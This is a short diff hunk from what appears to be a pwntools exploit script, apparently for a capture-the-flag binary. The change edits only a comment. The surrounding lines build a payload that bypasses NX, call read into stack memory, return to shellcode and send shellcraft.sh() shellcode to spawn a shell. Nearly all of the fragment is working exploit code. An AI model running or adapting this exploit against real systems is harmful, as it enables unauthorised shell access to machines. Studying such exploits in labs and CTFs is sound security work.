@@ -58,7 +58,7 @@ payload += p32(1024) #read size
 #execute shellcode onto the stack
 payload += p32(shellcode_addr)
 
-p.sendline(payload) #sending first payload to bypass NX and triggering read function
+p.sendline(payload) #sending first payload to bypass NX, triggering read function
 p.sendline(asm(shellcraft.sh())) #create shellcode using pwntools shellcraft then send it to the read function
 
 #get shell
